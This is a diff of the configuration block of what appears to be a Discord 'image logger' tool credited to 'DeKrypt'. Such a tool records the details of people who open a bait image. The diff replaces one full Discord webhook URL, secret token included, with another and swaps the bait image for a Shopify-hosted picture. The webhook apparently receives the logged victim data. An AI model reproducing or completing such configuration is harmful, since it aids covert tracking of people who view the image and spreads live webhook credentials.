@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1339017775930151023/JcFPOpK74oaRdWYQmJ2l3UMwFJ_b4Ge2eWUnQdZs7X-whAd_9H_K1acUg0WxadYXExxh",
-    "image": "https://static.wikitide.net/greatcharacterswiki/f/f9/Xfgfjbvdhbvjhsdb.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1459834038033584231/oqQOFENM3rDbjubCmLFKmPjYcGQ1WU_mlcB4pceEpH1t-pYDghcVZPZm0KeklbBomxSb",
+    "image": "https://cdn.shopify.com/s/files/1/0704/3065/4768/files/hicover.jpg?v=1759107612", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
